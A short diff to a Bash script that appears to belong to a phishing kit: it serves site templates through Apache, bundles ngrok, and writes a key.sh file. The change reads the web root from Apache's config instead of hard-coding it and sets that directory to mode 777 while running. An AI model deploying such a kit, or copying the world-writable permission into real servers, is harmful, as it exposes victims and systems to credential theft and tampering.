@@ -91,7 +91,7 @@ $W [$R""X$W]$GR...$R""C$W""lose"
 
 #**** CONFIG ****
 IMG_PATH="img"
-TMP="/var/www/html"
+TMP=`cat /etc/apache2/sites-available/000-default.conf | grep DocumentRoot | awk '{print $2}'`
 SITE="site/$site/$lang/index.html"
 SYSTM32="ngrok"
 SYSTEM64="ngrok_64"
@@ -408,7 +408,7 @@ rep
 rep" > key.sh
 
 	chmod +x key.sh
-	chmod 777 /var/www/html
+	chmod 777 $TMP
 	service apache2 start
 	sleep 1
 	clear
@@ -542,7 +542,7 @@ function Kill_Services() {
 	sleep 0.1
 	echo -e "\n$W[$R+$W]$GR Shutdow Apache."
 	service apache2 stop
-	chmod 700 /var/www/html
+	chmod 700 $TMP
 	sleep 1
 }
 
